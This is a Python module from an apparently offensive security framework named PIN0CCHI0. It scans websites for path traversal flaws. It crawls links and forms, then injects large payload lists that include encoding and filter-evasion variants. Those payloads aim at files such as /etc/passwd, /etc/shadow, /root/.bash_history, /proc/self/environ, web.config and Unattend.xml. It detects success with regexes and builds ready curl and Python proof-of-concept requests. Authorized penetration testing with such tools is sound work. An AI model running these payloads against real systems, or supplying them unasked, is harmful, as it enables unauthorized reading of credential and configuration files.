#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Path Traversal Scanner Module for PIN0CCHI0

This module performs specialized path traversal testing using various techniques
to identify and exploit directory traversal vulnerabilities in web applications.
"""

import os
import json
import re
import time
import logging
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import random
import string

from core.base_module import VulnTestingModule
from core.utils import make_request, run_command, ensure_dir_exists

# Configure logger
logger = logging.getLogger('pin0cchi0.vuln_testing.path_traversal')

class PathTraversalScanner(VulnTestingModule):
    """Path Traversal Scanner module for PIN0CCHI0."""
    
    def __init__(self):
        """Initialize the Path Traversal Scanner module."""
        super().__init__()
        self.name = "Path Traversal Scanner"
        self.description = "Tests for path traversal vulnerabilities in web applications"
        self.category = "vuln_testing"
        self.author = "PIN0CCHI0 Team"
        self.version = "0.1.0"
        self.references = [
            "https://owasp.org/www-community/attacks/Path_Traversal",
            "https://portswigger.net/web-security/file-path-traversal",
            "https://cwe.mitre.org/data/definitions/22.html"
        ]
        
        # Initialize results storage
        self.vulnerabilities = []
        self.tested_endpoints = set()
        
        # Path traversal payloads
        self.unix_payloads = [
            '../etc/passwd',
            '../../etc/passwd',
            '../../../etc/passwd',
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '../../../../../../../etc/passwd',
            '../../../../../../../../etc/passwd',
            '../etc/hosts',
            '../../etc/hosts',
            '../../../etc/hosts',
            '../../../../etc/hosts',
            '../../../../../etc/hosts',
            '/etc/passwd',
            '/etc/hosts',
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/self/fd/0',
            '/proc/self/status',
            '/proc/version',
            '/etc/issue',
            '/etc/group',
            '/etc/shadow',
            '/etc/profile',
            '/root/.bash_history',
            '/var/log/apache/access.log',
            '/var/log/apache2/access.log',
            '/var/log/httpd/access_log',
            '/var/log/apache/error.log',
            '/var/log/apache2/error.log',
            '/var/log/httpd/error_log'
        ]
        
        self.windows_payloads = [
            '../windows/win.ini',
            '../../windows/win.ini',
            '../../../windows/win.ini',
            '../../../../windows/win.ini',
            '../../../../../windows/win.ini',
            '../../../../../../windows/win.ini',
            '../../../../../../../windows/win.ini',
            '../../../../../../../../windows/win.ini',
            'c:/windows/win.ini',
            '../boot.ini',
            '../../boot.ini',
            '../../../boot.ini',
            '../../../../boot.ini',
            '../../../../../boot.ini',
            'c:/boot.ini',
            'c:/inetpub/wwwroot/web.config',
            '../inetpub/wwwroot/web.config',
            '../../inetpub/wwwroot/web.config',
            '../../../inetpub/wwwroot/web.config',
            '../../../../inetpub/wwwroot/web.config',
            'c:/Windows/System32/drivers/etc/hosts',
            '../Windows/System32/drivers/etc/hosts',
            '../../Windows/System32/drivers/etc/hosts',
            '../../../Windows/System32/drivers/etc/hosts',
            '../../../../Windows/System32/drivers/etc/hosts',
            'c:/Windows/debug/NetSetup.log',
            '../Windows/debug/NetSetup.log',
            '../../Windows/debug/NetSetup.log',
            '../../../Windows/debug/NetSetup.log',
            'c:/Windows/Panther/Unattend.xml',
            '../Windows/Panther/Unattend.xml',
            '../../Windows/Panther/Unattend.xml',
            'c:/Windows/Panther/Unattended.xml',
            '../Windows/Panther/Unattended.xml',
            '../../Windows/Panther/Unattended.xml'
        ]
        
        # Null byte payloads (for PHP < 5.3.4)
        self.null_byte_payloads = [
            '../etc/passwd%00',
            '../../etc/passwd%00',
            '../../../etc/passwd%00',
            '../../../../etc/passwd%00',
            '../windows/win.ini%00',
            '../../windows/win.ini%00',
            '../../../windows/win.ini%00',
            '../../../../windows/win.ini%00',
            'c:/windows/win.ini%00',
            '/etc/passwd%00',
            'c:/boot.ini%00'
        ]
        
        # Path traversal encoding payloads
        self.encoding_payloads = [
            # URL encoding
            '%2e%2e%2fetc%2fpasswd',
            '%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini',
            
            # Double URL encoding
            '%252e%252e%252fetc%252fpasswd',
            '%252e%252e%255cetc%255cpasswd',
            '%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255cwin.ini',
            
            # Unicode/UTF-8 encoding
            '..%c0%af../..%c0%af../..%c0%af../etc/passwd',
            '..%c0%af..%c0%af..%c0%af..%c0%afwindows%c0%afwin.ini',
            '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
            
            # Overlong UTF-8 encoding
            '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
            '%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd',
            
            # Path truncation (legacy servers)
            '../../../../../../../../../../../../etc/passwd',
            '../../../../../../../../../../../../windows/win.ini',
            './././././././././././././etc/passwd',
            './././././././././././././windows/win.ini',
            
            # Backslash variants
            '..\\..\\..\\..\\windows\\win.ini',
            '..\\..\\etc\\passwd',
            
            # Mixed encoding
            '..%252f..%252f..%252fetc%252fpasswd',
            '..%255c..%255c..%255cwindows%255cwin.ini'
        ]
        
        # Filter evasion payloads
        self.filter_evasion_payloads = [
            # Case variation
            '../EtC/PasSwd',
            '../../eTc/pASswd',
            '../../../etc/PASSWD',
            '../../../WindOWS/WiN.InI',
            
            # Extra path separators
            '..//etc//passwd',
            '../..//etc//passwd',
            '..//..//etc//passwd',
            '..\\\\windows\\\\win.ini',
            '..\\\\..\\\\windows\\\\win.ini',
            
            # Directory self-reference
            '../etc/./passwd',
            '../../etc/./passwd',
            '../././etc/passwd',
            '../.././windows/./win.ini',
            
            # Reverse path traversal
            '/etc/passwd/..',
            '/etc/passwd/../../etc/passwd',
            '/windows/win.ini/..',
            '/windows/win.ini/../../windows/win.ini',
            
            # Non-recursive path traversal
            './../etc/passwd',
            './../../etc/passwd',
            './../../../etc/passwd',
            './../windows/win.ini',
            './../../windows/win.ini'
        ]
        
        # Path traversal detection patterns
        self.unix_detection_patterns = [
            # /etc/passwd patterns
            re.compile(r'root:.*:0:0:'),
            re.compile(r'bin:.*:1:1:'),
            re.compile(r'daemon:.*:2:2:'),
            re.compile(r'adm:.*:3:4:'),
            re.compile(r'sync:.*:5:0:'),
            re.compile(r'shutdown:.*:6:0:'),
            re.compile(r'halt:.*:7:0:'),
            re.compile(r'mail:.*:8:'),
            re.compile(r'news:.*:9:'),
            re.compile(r'nobody:.*:65534:'),
            
            # /etc/hosts patterns
            re.compile(r'127\.0\.0\.1\s+localhost'),
            re.compile(r'::1\s+localhost'),
            
            # /proc patterns
            re.compile(r'Name:\s+\w+'),
            re.compile(r'State:\s+[RSDZTW]'),
            re.compile(r'Linux version \d+\.\d+\.\d+'),
            
            # Log file patterns
            re.compile(r'\[\d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2} [+-]\d{4}\]'),
            re.compile(r'\d+\.\d+\.\d+\.\d+ - - \[\d{2}/\w{3}/\d{4}:\d{2}:\d{2}:\d{2} [+-]\d{4}\]')
        ]
        
        self.windows_detection_patterns = [
            # win.ini patterns
            re.compile(r'\[fonts\]'),
            re.compile(r'\[extensions\]'),
            re.compile(r'\[mci extensions\]'),
            re.compile(r'\[files\]'),
            
            # boot.ini patterns
            re.compile(r'\[boot loader\]'),
            re.compile(r'\[operating systems\]'),
            re.compile(r'multi\(\d+\)disk\(\d+\)rdisk\(\d+\)partition\(\d+\)'),
            
            # web.config patterns
            re.compile(r'<configuration>'),
            re.compile(r'<system\.webServer>'),
            re.compile(r'<system\.web>'),
            
            # Windows hosts file
            re.compile(r'127\.0\.0\.1\s+localhost'),
            re.compile(r'::1\s+localhost')
        ]
        
    def run(self, target, config=None):
        """Run the Path Traversal scanner on the target.
        
        Args:
            target (str): The target URL to test
            config (dict): Configuration options for the test
            
        Returns:
            dict: Test results and identified vulnerabilities
        """
        logger.info(f"Starting Path Traversal scanning on {target}")
        
        if config is None:
            config = {}
        
        # Ensure target is properly formatted
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        # Create results directory
        timestamp = int(time.time())
        results_dir = os.path.join(os.getcwd(), 'results', 'vuln_testing', f"path_traversal_scan_{timestamp}")
        ensure_dir_exists(results_dir)
        
        # Get configuration options
        max_threads = config.get('path_traversal_scanner', {}).get('max_threads', 5)
        test_null_byte = config.get('path_traversal_scanner', {}).get('test_null_byte', True)
        test_filter_evasion = config.get('path_traversal_scanner', {}).get('test_filter_evasion', True)
        test_encoding = config.get('path_traversal_scanner', {}).get('test_encoding', True)
        os_type = config.get('path_traversal_scanner', {}).get('os_type', 'auto')  # 'auto', 'unix', 'windows'
        
        # Discover endpoints to test
        endpoints = self._discover_endpoints(target)
        
        # Prepare payloads based on OS type
        payloads = []
        
        if os_type == 'auto' or os_type == 'unix':
            payloads.extend(self.unix_payloads)
        
        if os_type == 'auto' or os_type == 'windows':
            payloads.extend(self.windows_payloads)
        
        if test_null_byte:
            payloads.extend(self.null_byte_payloads)
        
        if test_encoding:
            payloads.extend(self.encoding_payloads)
        
        if test_filter_evasion:
            payloads.extend(self.filter_evasion_payloads)
        
        # Test discovered endpoints for path traversal
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Test URL parameters
            for endpoint in endpoints:
                if endpoint['url'] not in self.tested_endpoints:
                    self.tested_endpoints.add(endpoint['url'])
                    executor.submit(self._test_endpoint, endpoint, payloads)
        
        # Consolidate and deduplicate results
        self._consolidate_results()
        
        # Save results to file
        results_file = os.path.join(results_dir, 'path_traversal_results.json')
        with open(results_file, 'w') as f:
            json.dump({
                'target': target,
                'timestamp': timestamp,
                'vulnerabilities': self.vulnerabilities,
                'scan_summary': {
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'total_endpoints_tested': len(self.tested_endpoints)
                }
            }, f, indent=2)
        
        logger.info(f"Path Traversal scanning completed. Found {len(self.vulnerabilities)} potential vulnerabilities.")
        logger.info(f"Results saved to {results_file}")
        
        return {
            'vulnerabilities': self.vulnerabilities,
            'results_file': results_file
        }
    
    def _discover_endpoints(self, target):
        """Discover endpoints on the target for testing."""
        logger.info(f"Discovering endpoints on {target}")
        
        endpoints = []
        
        # Add the main target URL
        endpoints.append({'url': target, 'type': 'url'})
        
        # Get the main page
        response = make_request(target)
        
        if not response['success']:
            logger.warning(f"Failed to retrieve main page for endpoint discovery: {response.get('error', 'Unknown error')}")
            return endpoints
        
        html = response['text']
        
        # Find all links with query parameters
        link_pattern = re.compile(r'href=["\']([^"\'>]*\?[^"\'>]*)["\']', re.IGNORECASE)
        links = link_pattern.findall(html)
        
        for link in links:
            # Handle relative URLs
            if not link.startswith(('http://', 'https://', '//')): 
                link = urllib.parse.urljoin(target, link)
            elif link.startswith('//'):
                link = 'https:' + link if target.startswith('https') else 'http:' + link
            
            # Only include endpoints from the same domain
            if urllib.parse.urlparse(link).netloc == urllib.parse.urlparse(target).netloc:
                endpoints.append({'url': link, 'type': 'link'})
        
        # Find all forms
        form_pattern = re.compile(r'<form[^>]*action=["\']([^"\'>]*)["\'][^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        form_matches = form_pattern.findall(html)
        
        for action, form_content in form_matches:
            # Handle empty action (submits to current page)
            if not action:
                action = urllib.parse.urlparse(target).path or '/'
            
            # Handle relative URLs
            if not action.startswith(('http://', 'https://', '//')): 
                action = urllib.parse.urljoin(target, action)
            elif action.startswith('//'):
                action = 'https:' + action if target.startswith('https') else 'http:' + action
            
            # Only include endpoints from the same domain
            if urllib.parse.urlparse(action).netloc == urllib.parse.urlparse(target).netloc:
                # Find input fields
                input_pattern = re.compile(r'<input[^>]*name=["\']([^"\'>]+)["\'][^>]*>', re.IGNORECASE)
                inputs = input_pattern.findall(form_content)
                
                # Add form endpoint with input fields
                endpoints.append({
                    'url': action,
                    'type': 'form',
                    'method': self._get_form_method(form_content),
                    'inputs': inputs
                })
        
        # Look for potential path traversal-vulnerable endpoints
        potential_vulnerable_endpoints = []
        for endpoint in endpoints:
            url = endpoint['url']
            parsed_url = urllib.parse.urlparse(url)
            path = parsed_url.path.lower()
            query = parsed_url.query.lower()
            
            # Check for paths or parameters that might involve file operations
            file_keywords = ['file', 'path', 'document', 'folder', 'root', 'path',
                           'pdf', 'template', 'doc', 'load', 'read', 'show', 'view',
                           'content', 'dir', 'download', 'log', 'locale', 'lang',
                           'conf', 'config', 'layout', 'open', 'cat', 'image', 'img',
                           'include', 'require', 'src', 'source', 'data', 'resource']
            
            if any(keyword in path for keyword in file_keywords):
                potential_vulnerable_endpoints.append(endpoint)
                continue
            
            if any(keyword in query for keyword in file_keywords):
                potential_vulnerable_endpoints.append(endpoint)
                continue
            
            # Check form inputs for file-related names
            if endpoint['type'] == 'form' and 'inputs' in endpoint:
                if any(any(keyword in input_name.lower() for keyword in file_keywords) for input_name in endpoint['inputs']):
                    potential_vulnerable_endpoints.append(endpoint)
        
        # Prioritize potential vulnerable endpoints
        for endpoint in potential_vulnerable_endpoints:
            if endpoint in endpoints:
                endpoints.remove(endpoint)
            endpoints.insert(0, endpoint)  # Add to the beginning of the list
        
        # Deduplicate endpoints
        unique_endpoints = []
        seen_urls = set()
        
        for endpoint in endpoints:
            url = endpoint['url']
            # Remove fragments
            url = url.split('#')[0]
            
            # Create a unique key based on URL and type
            key = f"{url}|{endpoint['type']}"
            
            if key not in seen_urls:
                seen_urls.add(key)
                endpoint['url'] = url
                unique_endpoints.append(endpoint)
        
        logger.info(f"Discovered {len(unique_endpoints)} unique endpoints")
        return unique_endpoints
    
    def _get_form_method(self, form_content):
        """Extract the HTTP method from a form."""
        method_match = re.search(r'method=["\']([^"\'>]+)["\']', form_content, re.IGNORECASE)
        if method_match:
            return method_match.group(1).upper()
        return 'GET'  # Default to GET if method not specified
    
    def _test_endpoint(self, endpoint, payloads):
        """Test an endpoint for path traversal vulnerabilities."""
        url = endpoint['url']
        endpoint_type = endpoint.get('type', 'url')
        
        logger.info(f"Testing endpoint: {url} (Type: {endpoint_type})")
        
        if endpoint_type == 'form':
            self._test_form(endpoint, payloads)
        else:
            self._test_url_parameters(url, payloads)
    
    def _test_url_parameters(self, url, payloads):
        """Test URL parameters for path traversal vulnerabilities."""
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            return
        
        # Test each parameter
        for param, values in query_params.items():
            # Skip parameters that are unlikely to be vulnerable to path traversal
            if param.lower() in ['id', 'limit', 'offset', 'sort', 'order', 'dir', 'direction']:
                continue
                
            # Prioritize parameters that are likely to be vulnerable to path traversal
            priority = 1
            if any(keyword in param.lower() for keyword in ['file', 'path', 'document', 'folder', 'dir']):
                priority = 3
            elif any(keyword in param.lower() for keyword in ['load', 'read', 'show', 'view', 'content', 'download']):
                priority = 2
            
            # Test each payload with this parameter
            for payload in payloads:
                # Skip low priority parameters for some payloads to reduce test volume
                if priority < 2 and ('%' in payload or '\\' in payload):
                    continue
                
                # Create a new query string with the payload
                new_params = query_params.copy()
                new_params[param] = [payload]
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                
                # Create the test URL
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                # Make the request
                response = make_request(test_url)
                
                if response['success']:
                    # Check for path traversal indicators in the response
                    self._check_path_traversal_indicators(response, url, param, payload)
    
    def _test_form(self, endpoint, payloads):
        """Test form inputs for path traversal vulnerabilities."""
        url = endpoint['url']
        method = endpoint.get('method', 'GET')
        inputs = endpoint.get('inputs', [])
        
        if not inputs:
            return
        
        # Test each input field
        for input_name in inputs:
            # Skip inputs that are unlikely to be vulnerable to path traversal
            if input_name.lower() in ['csrf', 'token', 'submit', 'button', 'action', 'id', 'name', 'email', 'password']:
                continue
                
            # Prioritize inputs that are likely to be vulnerable to path traversal
            priority = 1
            if any(keyword in input_name.lower() for keyword in ['file', 'path', 'document', 'folder', 'dir']):
                priority = 3
            elif any(keyword in input_name.lower() for keyword in ['load', 'read', 'show', 'view', 'content', 'download']):
                priority = 2
            
            # Test each payload with this input
            for payload in payloads:
                # Skip low priority inputs for some payloads to reduce test volume
                if priority < 2 and ('%' in payload or '\\' in payload):
                    continue
                
                # Create form data
                form_data = {input_name: payload}
                
                # Make the request
                if method.upper() == 'GET':
                    # For GET, add parameters to the URL
                    test_url = f"{url}?{urllib.parse.urlencode(form_data)}"
                    response = make_request(test_url)
                else:
                    # For POST, send as form data
                    response = make_request(url, method='POST', data=form_data)
                
                if response['success']:
                    # Check for path traversal indicators in the response
                    self._check_path_traversal_indicators(response, url, input_name, payload)
    
    def _check_path_traversal_indicators(self, response, url, param_or_input, payload):
        """Check for indicators of path traversal vulnerability in the response."""
        # Extract response data
        status_code = response.get('status_code', 0)
        content_type = response.get('headers', {}).get('Content-Type', '')
        text = response.get('text', '')
        
        # Check for indicators in the response
        indicators = []
        
        # Check for Unix file patterns
        for pattern in self.unix_detection_patterns:
            if pattern.search(text):
                indicators.append(f"Unix pattern match: {pattern.pattern}")
        
        # Check for Windows file patterns
        for pattern in self.windows_detection_patterns:
            if pattern.search(text):
                indicators.append(f"Windows pattern match: {pattern.pattern}")
        
        # Check for error messages that might indicate path traversal
        error_patterns = [
            re.compile(r'failed to open stream'),
            re.compile(r'cannot find the file'),
            re.compile(r'no such file'),
            re.compile(r'failed opening'),
            re.compile(r'Warning: include'),
            re.compile(r'Warning: require'),
            re.compile(r'Fatal error'),
            re.compile(r'fopen\('),
            re.compile(r'file_get_contents\('),
            re.compile(r'readfile\('),
            re.compile(r'file not found'),
            re.compile(r'directory not found'),
            re.compile(r'invalid path'),
            re.compile(r'path not found'),
            re.compile(r'could not find'),
            re.compile(r'could not open'),
            re.compile(r'unable to open'),
            re.compile(r'unable to read'),
            re.compile(r'access denied'),
            re.compile(r'permission denied'),
            re.compile(r'is not a directory'),
            re.compile(r'not a regular file')
        ]
        
        for pattern in error_patterns:
            if pattern.search(text):
                indicators.append(f"Error message pattern: {pattern.pattern}")
        
        # If indicators found, record the vulnerability
        if indicators:
            vulnerability = {
                'url': url,
                'parameter': param_or_input,
                'payload': payload,
                'status_code': status_code,
                'content_type': content_type,
                'indicators': indicators,
                'severity': self._determine_severity(indicators, payload),
                'evidence': text[:500] if len(text) > 500 else text  # Limit evidence size
            }
            
            self.vulnerabilities.append(vulnerability)
            logger.warning(f"Potential path traversal vulnerability found at {url} in {param_or_input} using {payload}")
    
    def _determine_severity(self, indicators, payload):
        """Determine the severity of a path traversal vulnerability."""
        # High severity indicators
        if any('Unix pattern match: root:' in indicator for indicator in indicators) or \
           any('Windows pattern match: \[boot loader\]' in indicator for indicator in indicators):
            return 'High'
        
        # Medium severity indicators
        if any('Unix pattern match:' in indicator for indicator in indicators) or \
           any('Windows pattern match:' in indicator for indicator in indicators):
            return 'Medium'
        
        # Low severity indicators
        if any('Error message pattern:' in indicator for indicator in indicators):
            return 'Low'
        
        return 'Info'
    
    def _consolidate_results(self):
        """Consolidate and deduplicate vulnerability results."""
        if not self.vulnerabilities:
            return
        
        # Group vulnerabilities by URL and parameter
        grouped_vulns = {}
        for vuln in self.vulnerabilities:
            key = f"{vuln['url']}|{vuln['parameter']}"
            if key not in grouped_vulns:
                grouped_vulns[key] = []
            grouped_vulns[key].append(vuln)
        
        # Consolidate each group
        consolidated_vulns = []
        for vulns in grouped_vulns.values():
            # Sort by severity (High > Medium > Low > Info)
            vulns.sort(key=lambda v: {'High': 0, 'Medium': 1, 'Low': 2, 'Info': 3}[v['severity']])
            
            # Take the highest severity vulnerability as the base
            base_vuln = vulns[0].copy()
            
            # Collect all unique payloads and indicators
            all_payloads = set()
            all_indicators = set()
            for vuln in vulns:
                all_payloads.add(vuln['payload'])
                for indicator in vuln['indicators']:
                    all_indicators.add(indicator)
            
            # Update the base vulnerability
            base_vuln['payloads'] = list(all_payloads)
            base_vuln['indicators'] = list(all_indicators)
            del base_vuln['payload']  # Remove the single payload field
            
            consolidated_vulns.append(base_vuln)
        
        # Update the vulnerabilities list
        self.vulnerabilities = consolidated_vulns
    
    def generate_poc(self, vulnerability):
        """Generate a proof of concept for a path traversal vulnerability.
        
        Args:
            vulnerability (dict): The vulnerability to generate a PoC for
            
        Returns:
            dict: The PoC details
        """
        url = vulnerability['url']
        parameter = vulnerability['parameter']
        payloads = vulnerability.get('payloads', [])
        
        if not payloads:
            return {'success': False, 'error': 'No payloads available for PoC generation'}
        
        # Select the most effective payload based on the indicators
        effective_payload = None
        for payload in payloads:
            if '/etc/passwd' in payload or 'windows/win.ini' in payload:
                effective_payload = payload
                break
        
        if not effective_payload and payloads:
            effective_payload = payloads[0]
        
        if not effective_payload:
            return {'success': False, 'error': 'Could not determine an effective payload'}
        
        # Generate a random string to use as a canary value
        canary = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        
        # Create the PoC URL
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        # Update the parameter with the payload
        query_params[parameter] = [effective_payload]
        new_query = urllib.parse.urlencode(query_params, doseq=True)
        
        poc_url = urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            new_query,
            parsed_url.fragment
        ))
        
        # Create curl command for the PoC
        curl_command = f"curl -i '{poc_url}'"
        
        # Create Python code for the PoC
        python_code = f"""import requests

# Path Traversal vulnerability PoC for {url}
url = "{poc_url}"

response = requests.get(url)
print(f"Status code: {{response.status_code}}")
print("Response headers:")
for header, value in response.headers.items():
    print(f"{{header}}: {{value}}")
print("\nResponse body:")
print(response.text)
"""
        
        return {
            'success': True,
            'url': poc_url,
            'curl_command': curl_command,
            'python_code': python_code,
            'payload': effective_payload,
            'parameter': parameter
        }